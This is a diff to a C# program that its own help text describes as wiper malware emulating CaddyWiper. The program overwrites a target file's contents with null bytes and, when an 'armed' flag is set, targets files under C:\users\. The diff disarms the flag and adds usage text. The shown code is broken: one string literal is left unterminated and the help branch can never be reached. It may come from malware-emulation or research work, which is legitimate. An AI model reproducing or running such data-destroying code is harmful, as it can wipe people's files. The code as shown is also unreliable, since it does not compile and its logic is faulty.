@@ -23,22 +23,31 @@ namespace emu
             return nullbytes;
         }
 
-        static void Main()
+        static void Main(string[] args)
         {
             //string filepath = "C:\\users\\zoe\\Desktop\\test.txt";
             //wipe(filepath);
-            int armed = 1;
-            if(armed == 0)
-            {
-                Console.WriteLine("not armed. Exiting...");
-            }
-            else if(armed == 1) 
+            int armed = 0;
+            if (armed == 1)
             {
                 DirectoryInfo directoryinfo = new DirectoryInfo("C:\\users\\");
-                foreach(FileInfo file in directoryinfo.GetFiles()) 
+                foreach (FileInfo file in directoryinfo.GetFiles())
                 {
                     Console.WriteLine(file.FullName);
                 }
+            }
+            else if (armed == 0)
+            {
+                Console.WriteLine("not armed, proceeding with );
+            }
+            else if (args[0] == "-h" || args[0] == "-help" || args[0] == "/help")
+            {
+                Console.WriteLine("Usage: run the executable with the path to a target file. This will turn the contents of the file to null bytes.");
+                Console.WriteLine("if armed == 1, this wiper malware *WILL* attempt to perform CaddyWiper's activity in `C:\\users\\`. PLEASE USE WITH CAUTION");
+            }
+            else
+            {
+                Console.WriteLine("ERROR:");
             }
         }
     }
